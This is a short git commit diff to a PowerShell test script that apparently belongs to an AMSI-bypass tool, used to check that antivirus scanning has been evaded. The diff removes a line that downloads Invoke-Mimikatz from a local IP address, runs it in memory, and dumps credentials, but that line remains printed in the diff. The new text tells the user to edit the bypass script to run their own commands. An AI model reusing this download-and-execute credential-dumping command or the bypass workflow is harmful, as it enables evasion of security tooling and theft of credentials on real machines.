59afee68db69a805ead4150fb3c004a7bdfed5bc
M0M3NTUM44 <lahavisme@gmail.com>
2023-04-04 13:24:52 +0300

    4.4.23

--- TestScript.ps1
+++ TestScript.ps1
@@ -1,5 +1,4 @@
 # Benign test script to test if the Bypass was seccussful(This will tyoe your username to terminal).
-powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
 $username = $env:USERNAME
-$evilString = "Invoke Mimikatz"
-Write-Host "$username $evilString if you see this AMSI is Bypassed"
+Write-Host "$username if you see this AMSI is Bypassed"
+Write-Host "You should change the 'AMSIReflectionCrypt.ps1' script in line 55 to run your own powershell commands"
